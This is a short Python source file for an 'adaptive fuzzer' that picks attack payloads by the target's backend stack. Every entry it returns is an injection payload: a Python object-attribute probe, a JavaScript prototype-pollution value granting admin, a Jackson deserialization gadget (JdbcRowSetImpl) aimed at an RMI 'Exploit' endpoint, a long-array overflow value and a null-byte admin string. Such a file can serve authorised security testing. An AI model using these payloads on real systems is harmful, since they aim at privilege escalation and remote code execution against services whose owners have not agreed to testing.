"""
Contextual Adaptive Syntax Payload Generator (No Static Wordlists).
"""

from typing import List, Dict, Any


class AdaptiveFuzzer:
    def __init__(self):
        pass

    def generate_contextual_payloads(self, target_tech: str, parameter_name: str) -> List[Dict[str, Any]]:
        """
        Dynamically generates syntax-valid context-aware payloads based on backend tech stack detection
        rather than relying on static pre-cooked wordlists.
        """
        payloads = []

        if target_tech.lower() in ("python", "django", "flask", "fastapi"):
            payloads.append({
                "name": "python_object_injection_probe",
                "value": {"__class__": "User", "__module__": "models"},
                "syntax_type": "python_magic_attr"
            })
        elif target_tech.lower() in ("node", "express", "nested"):
            payloads.append({
                "name": "prototype_pollution_probe",
                "value": {"__proto__": {"admin": True}},
                "syntax_type": "js_prototype_mutation"
            })
        elif target_tech.lower() in ("java", "spring"):
            payloads.append({
                "name": "jackson_type_probe",
                "value": ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName": "rmi://localhost:1099/Exploit"}],
                "syntax_type": "java_deserialization_class"
            })

        # Generic type boundaries
        payloads.append({"name": "array_boundary_shift", "value": ["A" * 100], "syntax_type": "type_mutation"})
        payloads.append({"name": "null_byte_injection", "value": "\x00admin", "syntax_type": "string_truncation"})

        return payloads
